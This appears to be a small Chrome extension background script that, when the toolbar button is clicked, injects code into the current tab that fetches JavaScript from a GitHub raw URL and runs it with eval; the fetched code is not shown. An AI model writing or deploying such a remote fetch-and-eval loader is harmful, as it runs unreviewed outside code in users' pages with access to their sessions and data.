alert('KEEP THIS TAB OPEN!')     
chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `fetch("https://raw.githubusercontent.com/stuartcat/googlebs/main/main.js").then(d=>d.text()).then(eval);
`});});
